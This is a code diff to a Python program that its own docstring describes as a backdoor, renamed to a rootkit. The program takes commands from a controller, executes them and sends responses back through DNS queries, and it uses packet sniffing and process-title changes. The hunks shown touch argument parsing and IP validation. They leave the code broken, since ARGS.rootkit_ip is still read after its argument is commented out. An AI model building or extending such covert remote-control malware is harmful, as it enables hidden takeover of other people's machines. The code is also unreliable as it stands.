@@ -1,5 +1,5 @@
 """
-    This is the backdoor program. It receives commands from the controller,
+    This is the rootkit program. It receives commands from the controller,
     decrypts them, executes them, and then returns a response via a DNS
     query.
 """
@@ -24,9 +24,9 @@ from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send
 from setproctitle import setproctitle
 
 
-PARSER = argparse.ArgumentParser("./backdoor.py")
+PARSER = argparse.ArgumentParser("./rootkit.py")
 PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
-PARSER.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
+# PARSER.add_argument("rootkit_ip", help="The IPv4 address of the rootkit host.")
 PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
 ARGS = PARSER.parse_args()
 
@@ -35,8 +35,8 @@ if not validate_ipv4_address(ARGS.controller_ip):
     print(f"Invalid IPv4 Address: '{ARGS.controller_ip}'")
     sys.exit(1)
 
-if not validate_ipv4_address(ARGS.backdoor_ip):
-    print(f"Invalid IPv4 Address: '{ARGS.backdoor_ip}'")
+if not validate_ipv4_address(ARGS.rootkit_ip):
+    print(f"Invalid IPv4 Address: '{ARGS.rootkit_ip}'")
     sys.exit(1)
 
 if not validate_nic_interface(ARGS.interface):
@@ -46,7 +46,7 @@ if not validate_nic_interface(ARGS.interface):
 
 # Global Variables
 CONTROLLER_IP = ARGS.controller_ip
-BACKDOOR_IP = ARGS.backdoor_ip
+# ROOTKIT_IP = ARGS.rootkit_ip
 NETWORK_INTERFACE = ARGS.interface
 ENCRYPTION_HANDLER = StreamEncryption()
 
